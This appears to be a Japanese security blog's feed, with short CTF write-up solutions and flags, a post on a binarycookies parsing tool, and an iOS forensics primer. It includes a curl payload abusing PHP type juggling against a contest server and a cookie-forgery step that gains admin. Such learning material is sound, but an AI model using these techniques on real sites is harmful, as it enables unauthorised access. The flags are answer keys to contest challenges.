&lt;li&gt;JPEGが渡されるが、binwalkをかけると中にzipがあるので取り出す&lt;/li&gt;
&lt;li&gt;取り出したzipを展開すると壊れたbmpとパスワード付きのzipが展開される&lt;/li&gt;
&lt;li&gt;bmpファイルの末尾にはbase64エンコードされたような文字列があるのでデコードするとzipのパスワード&lt;/li&gt;
&lt;li&gt;zipを展開するとpngファイルがでてくる&lt;/li&gt;
&lt;li&gt;stegosolveで適当にぽちぽちやるとFLAG&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{st3gs0lv3_1s_u53ful}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;cookie-monster&#34;&gt;Cookie Monster&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Cookieにflagというフィールドがあり、MD5が設定されている&lt;/li&gt;
&lt;li&gt;どこかのMD5クラックサイトで検索すると&lt;code&gt;pc&lt;/code&gt;がでてくる&lt;/li&gt;
&lt;li&gt;フラグフォーマットは、&lt;code&gt;pctf{&lt;/code&gt;なのでひたすらこのCookieのMD5の元を考えれば良いとわかる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{c0oki3s_@re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;feed-me&#34;&gt;Feed_me&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;バイナリを読むと、渡された乱数3つがチェック用の値になっている&lt;/li&gt;
&lt;li&gt;入力文字列を10byteずつ分割してatoiに流し込んでいて、以下の式が成り立てばおｋなので、あとは算数
&lt;code&gt;
x + y = a1
y + z = a2
x + z = a3
&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;自分が解いたときのケース
&lt;code&gt;
Can you cook my favourite food using these ingredients :)
-10026 ; -8250 ; -12490 ;
-000007133-000002893-000005357
That&#39;s yummy.... Here is your gift:
pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}
&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;game-of-faces&#34;&gt;Game of Faces&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;ページにアクセスすると3色のよくわからん正方形があるが、ソースを見るとファイルアップロードが見える&lt;/li&gt;
&lt;li&gt;適当にファイルをアップロードするとh1タグでbase64エンコードされた文字列が帰ってくるのでデコードするとファイル名がわかる&lt;/li&gt;
&lt;li&gt;ファイル名で直接アクセスするとフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{You_L00K_Wi3Rd_IN_H3R3}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;easy-rsa&#34;&gt;Easy RSA&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;e, c, nのパラメータが渡されるが、eが著しく大きいので、Wiener&amp;rsquo;s Attackだとわかる&lt;/li&gt;
&lt;li&gt;コード書いて、秘密鍵dを計算すると&lt;code&gt;12978409760901509356642421072925801006324287746872153539187221529835976408177&lt;/code&gt;だとわかる&lt;/li&gt;
&lt;li&gt;あとは普通にRSAを解読したら、出てきた数値を16進数表記にして1byteずつasciiにすればフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{Sup3r_st4nd4rd_W31n3r_4tt4ck}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;late-pr&#34;&gt;Late PR&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;課題を提出しようとしてたけどパソコンがクラッシュしたという問題文とともにイメージファイルが渡される&lt;/li&gt;
&lt;li&gt;vol.pyでプロセスを見るとchrome.exeがexitしていることがわかり、GoogleChromeCrashHandler.exeというプロセスの存在に気づくので、当該プロセスのメモリダンプを見てみるとフラグ

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vol.py -f *.raw --profile Win7SP1x86_23418 pslist&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vol.py -f *.raw --profile Win7SP1x86_23418 memdump --dump-dir .&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;strings 468.dmp | grep pctf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{Late_submissions_can_be_good}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;mandatory-php&#34;&gt;Mandatory PHP&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;以下のPHPのコードが渡される&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#bc7a00&#34;&gt;&amp;lt;?php&lt;/span&gt; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;; 
highlight_file(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val1&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val2&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val3&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val4&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;/[^A-Za-z]/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;)) 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;oh my gawd...&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;hash(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;sha256&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;); 
&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;(log10(&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;**&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0.5&lt;/span&gt;)))&lt;span style=&#34;color:#666&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;) 
&lt;span style=&#34;color:#19177c&#34;&gt;$s1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Bye...&amp;#34;&lt;/span&gt;); 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$s1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;) 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag1&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;;&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;10&lt;/span&gt;;&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;++&lt;/span&gt;){ 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;)) 
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;duck&amp;#39;&lt;/span&gt;); 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
        &lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;); 
}     
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;WoAHh!&amp;#34;&lt;/span&gt;) 
&lt;span style=&#34;color:#19177c&#34;&gt;$s2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;oops..&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$s2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;) 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag2&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;end...&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#bc7a00&#34;&gt;?&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;val1&lt;/code&gt;が&lt;code&gt;INF&lt;/code&gt;になるので、&lt;code&gt;val3&lt;/code&gt;と&lt;code&gt;val4&lt;/code&gt;でINFになるようにデカイ数を渡して、&lt;code&gt;val2&lt;/code&gt;は10回urldecodeして&lt;code&gt;WoAHh!&lt;/code&gt;になるようにパラメータを渡せば良い&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl &#39;http://159.89.166.12:14000///index.php?ffval1=0&amp;amp;val2=WoAHh%2525252525252525252521&amp;amp;val3=101&amp;amp;val4=大きい値&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{b3_c4r3fu1_w1th_pHp_f31145}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;終了後に解いた問題&#34;&gt;終了後に解いた問題&lt;/h2&gt;

&lt;h3 id=&#34;magic-pngs&#34;&gt;Magic PNGs&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;パスワード付きzipとpngファイルが渡されるが、&lt;code&gt;file&lt;/code&gt;コマンドを叩くと&lt;code&gt;data&lt;/code&gt;都市てか表示されないためヘッダーなどが間違っていると推測できる&lt;/li&gt;
&lt;li&gt;案の定Magic numberが間違っているので修正するが、それでも開かない&lt;/li&gt;
&lt;li&gt;PNGは通常IDATチャンクがあるはずだが、そのキーワードが&lt;code&gt;idat&lt;/code&gt;と小文字になっていたのでこれを修正すると開けて、&lt;code&gt;h4CK3RM4n&lt;/code&gt;が読み取れる&lt;/li&gt;
&lt;li&gt;ヒントから、この値をmd5してパスワードzipを展開するとフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{y0u_s33_m33_n0w!}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ファイルヘッダーとかが違うところに気づいていなかった&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;exorcism&#34;&gt;EXORcism&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;大量の1と0があるファイルを渡される&lt;/li&gt;
&lt;li&gt;100x100の正方形に整形して、1をスペース、0は黒として描画するとQRコードになる&lt;/li&gt;
&lt;li&gt;QRコードを読み取ると、&lt;code&gt;160f15011d1b095339595138535f135613595e1a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;タイトルがXORなので、この文字列となにかをxorする必要があると推測できる&lt;/li&gt;
&lt;li&gt;フラグフォーマットの&lt;code&gt;pctf{&lt;/code&gt;になるようにxorする値を計算すると&lt;code&gt;flagf&lt;/code&gt;になるので、&lt;code&gt;flag&lt;/code&gt;を繰り返してxorすれば良いとわかるので、それで計算するとフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{wh4_50_53r1u5?}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;そもそもQRコードになるなんて想像ができなかった&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;save-earth&#34;&gt;Save Earth&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;USBパケットのデータが渡されて入力した値を求めさせる&lt;/li&gt;
&lt;li&gt;データ内にasciiがないので、間隔つまりモールス信号だと推測する&lt;/li&gt;
&lt;li&gt;USBパケットの末尾のデータ部から4をスペース、1と2をそれぞれモールス信号にするとフラグが得られる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CTFS4V3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>BesidesCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/bsidessf2019/</link>
      <pubDate>Sun, 10 Mar 2019 22:43:52 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/bsidessf2019/</guid>
      <description>

&lt;h2 id=&#34;blink&#34;&gt;blink&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;apkが渡されるのでunzipして、&lt;code&gt;classes.dex&lt;/code&gt;をdex2jarでjarファイルに変換&lt;/li&gt;
&lt;li&gt;jarファイルをunzipして、classファイルをjadで一括逆コンパイル&lt;/li&gt;
&lt;li&gt;適当にファイルを眺めていると&lt;code&gt;/com/example/blink/r2d2.jad&lt;/code&gt;にbase64でエンコードされた文字列があるのでデコード&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CTF{PUCKMAN}&lt;/code&gt;と書かれた画像が出てくる&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;zippy&#34;&gt;zippy&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;pcapngが渡されるのでFollo TCP Streamをすると&lt;code&gt;supercomplexpassword&lt;/code&gt;がzipのパスワードだとわかる&lt;/li&gt;
&lt;li&gt;パケットからzipファイルを通信してるパケットを見つけて抽出&lt;/li&gt;
&lt;li&gt;パスワードを使ってunzipすると中のflag.txtに&lt;code&gt;CTF{this_flag_is_your_flag}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;futurella&#34;&gt;futurella&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;HTMLのソースを見ると&lt;code&gt;CTF{bring_it_back}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;kookie&#34;&gt;kookie&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cookie/monster&lt;/code&gt;でログインできるのでログインする&lt;/li&gt;
&lt;li&gt;その際のCookieを見ると、&lt;code&gt;cookie&lt;/code&gt;になっているので、これを&lt;code&gt;admin&lt;/code&gt;に変更&lt;/li&gt;
&lt;li&gt;その後reloadすると&lt;code&gt;CTF{kookie_cookies}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>binarycookiesファイル解析ツールbincookie</title>
      <link>https://owlinux1000.github.io/blog/post/analyzing_binary_cookie/</link>
      <pubDate>Wed, 06 Mar 2019 23:10:49 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/analyzing_binary_cookie/</guid>
      <description>

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;iOSやMacのフォレンジックでは、アーティファクトの1つとしてCookie情報を利用します。macOSでは、&lt;code&gt;/User/ユーザ名/Library/Cookies/Cookies.binarycookies&lt;/code&gt; に存在します。しかしながら、本ファイルは拡張子からもわかるようにバイナリ形式になっています。そこで、本記事ではこのバイナリファイルを解析するツールをご紹介します。&lt;/p&gt;

&lt;h2 id=&#34;bincookie&#34;&gt;bincookie&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/owlinux1000/bincookie&#34;&gt;bincookie&lt;/a&gt;&lt;br /&gt;
拙作のGolangで実装された解析ツールです。goユーザなら&lt;code&gt;go get&lt;/code&gt;で入りますし、Releaseからバイナリのダウンロードもできます。&lt;br /&gt;
本ツールの特徴として、&lt;code&gt;curl&lt;/code&gt;コマンドで利用できる形式として出力する点です。私の手元にあった&lt;code&gt;/Users/ユーザ名/Library/Cookies/com.apple.iTunes.binarycookies&lt;/code&gt;に対して適用した例が以下です。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ bincookie /Users/ユーザ名/Library/Cookies/com.apple.iTunes.binarycookies
# Netscape HTTP Cookie File
# This file was generated by owlinux1000&amp;#39;s bincookie
# https://github.com/owlinux1000/bincookie

.apple.com	TRUE	/	TRUE	1566914111	xp_ci	hogehogehoge
.apple.com	TRUE	/	TRUE	1566914111	xp_ab	hogehogehoge
.xp.apple.com	TRUE	/	TRUE	1566914111	xp_aci	hogehogehog&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、同様のソフトウェアとして以下の2つが存在します。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/as0ler/BinaryCookieReader&#34;&gt;BinaryCookieReader&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/horrorho/burnt-cookie&#34;&gt;Burnt Cookie&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;おわりに&#34;&gt;おわりに&lt;/h2&gt;

&lt;p&gt;binarycookiesファイル解析ツールbincookieの宣伝をしました。binarycookiesファイルを解析する際には、ぜひbincookie使ってみてください。バグか何かあったらissueやPR待ってます。&lt;/p&gt;
</description>
    </item>
    <item>
      <title>iOSデバイスフォレンジック入門</title>
      <link>https://owlinux1000.github.io/blog/post/an_introduction_of_ios_forensics/</link>
      <pubDate>Thu, 28 Feb 2019 21:00:00 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/an_introduction_of_ios_forensics/</guid>
      <description>

&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;

&lt;p&gt;本記事では、&lt;strong&gt;iOSフォレンジックをやったことない&lt;/strong&gt;人向けに基本的な情報をまとめてみました。取っ掛かりとしては簡単に読める内容だと思います。主にiOSデバイスのバックアップデータやその解析ツールについてご紹介しています。&lt;/p&gt;

&lt;h2 id=&#34;準備&#34;&gt;準備&lt;/h2&gt;

&lt;p&gt;本記事では主に以下のデバイスやソフトウェアを使って検証しています。当該デバイスやバージョンでない場合同じ結果や解釈にならない可能性もありますのでご了承ください。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;iPad mini4 (iOS 12.1.1 非Jailbreak)&lt;/li&gt;
&lt;li&gt;MacBookPro (High Sierra 10.13.6)&lt;/li&gt;
&lt;li&gt;iTunes (12.8.3)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;ios-概要&#34;&gt;iOS 概要&lt;/h2&gt;

&lt;p&gt;iOSは、iPhoneやiPad、Apple Watch等で利用されているOSです。iOSは大きく分けて、以下の4つのシステムから構成されています。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Cocoa Touch&lt;/li&gt;
&lt;li&gt;Media&lt;/li&gt;
&lt;li&gt;Cocoa Service&lt;/li&gt;
&lt;li&gt;Core OS&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Cocoa Touchは、名前からもわかるようにタッチ操作を始めとするユーザーインタフェースのシステムです。Mediaは、動画像や音楽などMedia用のシステムです。Cocoa Serviceは、アプリケーションにとって必要な基本的なシステムを提供しています。最後のCore OSは、ハードウェアに近いより低レイヤーなネットワークやメモリ管理、スレッドの機能などを提供しています。&lt;/p&gt;

&lt;p&gt;次に、iOSで用いられているファイルシステムについて簡単にご紹介いたします。近年のiOSではAPFS（Apple File System）と呼ばれるファイルシステムが利用されています。従来はHFS、HFS+が使われていましたが、2017年のiOS 10.3からAPFSが導入されました。APFSの特徴としては、inodeが64bitに拡張されたためより多くのファイルが扱えるようになったり、CoW（Copy on Write）のサポート、タイムスタンプがナノ秒単位まで記録するようになったりなど従来のファイルシステムに比べ大きく変わっています。より詳細な情報としては以下のWebページなどが参考になると思います。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ja.wikipedia.org/wiki/Apple_File_System&#34;&gt;Apple File System&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://cyberforensic.focus-s.com/knowledge/articles_detail/356/&#34;&gt;ファイルシステムがAPFSになった事による変更点&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;itunesバックアップ&#34;&gt;iTunesバックアップ&lt;/h2&gt;

&lt;p&gt;iOSデバイスにおけるデータを抽出する方法としては、物理と論理の2通りの方法があります。しかしながら、物理デバイスから情報を抽出するためには、機材が必要であったり、論理面でも有償のツールが必要なことが多く入門には不向きです。そこで本記事では、iTunesのバックアップデータを元にiOSデバイスのフォレンジック調査に役立つ情報をまとめていこうと思います。もしすでにホストマシンにiTunesを用いてバックアップをとっている人はそのデータをお使いできます。もしなければ、iOSデバイスを接続し、iTunesの画面よりバックアップをとってください。&lt;/p&gt;

&lt;p&gt;iOSデバイスのバックアップデータは、以下の場所に格納されます。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Mac：&lt;code&gt;/User/ユーザ名/Library/Application Support/MobileSync/Backup&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Windows：&lt;code&gt;\AppData\Roaming\Apple Computer\MobileSync\Backup\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Windowsストアアプリ経由でiTunesを入れた場合：&lt;code&gt;%USERPROFILE%\Apple\MobileSync\Backup&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;バックアップを行っている状態で、上記フォルダにアクセスするとハッシュ値が名前のフォルダがあると思います。それがバックアップデータの本体です。バックアップデータのフォルダの中には、主に以下のファイルやフォルダが格納されていると思います。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Manifest.plist&lt;/li&gt;
&lt;li&gt;Manifest.db&lt;/li&gt;
&lt;li&gt;Info.plist&lt;/li&gt;
&lt;li&gt;Status.plist&lt;/li&gt;
&lt;li&gt;大量のフォルダ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Manifest.plistは、主にバックアップの内容について記載されています。例えばバックアップした日時、バックアップを暗号化しているかどうか、インストールしたアプリケーション一覧などがあげられます。Manifest.dbは、SQLiteのデータベースファイルで、バックアップデータに含まれるファイルやフォルダの情報が格納してあります。&lt;code&gt;fileID&lt;/code&gt;カラムには、SHA1が格納されており、これはファイル名を表しています。そのため、バックアップフォルダの中で、このハッシュ値を使って検索したりします。&lt;br /&gt;
以下の図は、DB Browser for SQLiteでManifest.dbを読み込んだときの図です。CUIのsqlite3コマンドなどでも良いのですが、フォレンジック業務をやるときには、フィルターやソート、検索などが手軽に使えるほうが効率が良いので、こういったGUIツールを使っています。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://imgur.com/download/2PzjpVu&#34; alt=&#34;Manifest.db&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Info.plistは、主にバックアップ対象のデバイス情報について記載されています。例えば、IMEIやシリアルナンバー、最後にバックアップした日などが挙げられます。Status.plistは、主にバックアップ状況について記載されています。&lt;/p&gt;

&lt;p&gt;バックアップフォルダの中に格納されている主要なアーティファクトは、SANSの公開資料の&lt;a href=&#34;https://digital-forensics.sans.org/media/DFIR-Smartphone-Forensics-Poster.pdf&#34;&gt;DFIR-Smartphone-Forensics-Poster.pdf&lt;/a&gt; に掲載されています。とても便利なのでダウンロードしておくことをおすすめします。&lt;/p&gt;

&lt;h2 id=&#34;itunesバックアップ解析ツール&#34;&gt;iTunesバックアップ解析ツール&lt;/h2&gt;

&lt;p&gt;今まで見てきたバックアップデータなどを解析する際に役立つツールをご紹介します。&lt;/p&gt;

&lt;h3 id=&#34;plutil&#34;&gt;plutil&lt;/h3&gt;

&lt;p&gt;拡張子plistのバイナリファイルの中身を解析する際には、&lt;code&gt;plutil&lt;/code&gt;コマンドが便利です。Macの場合は標準でインストールされているのですぐに使えます。Windowsでは、&lt;a href=&#34;https://www.icopybot.com/plist-editor.htm&#34;&gt;plist Editor Pro for Windows&lt;/a&gt;というものが存在するので、それを利用できそうです（未検証）。&lt;/p&gt;

&lt;p&gt;本来&lt;code&gt;plutil&lt;/code&gt;コマンドはいろいろな操作ができますが、今回はフォレンジックでよく使うplistファイルを別のファイルに変換する操作をご紹介します。以下は、&lt;code&gt;Info.plist&lt;/code&gt;ファイルをxmlファイルに変換する場合の例です。plistファイルはバイナリファイルなので、こういった変換を行うことが必要となってきます。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;$ plutil -t convert xml1 Info.plist -o Info.xml&lt;/pre&gt;&lt;/div&gt;
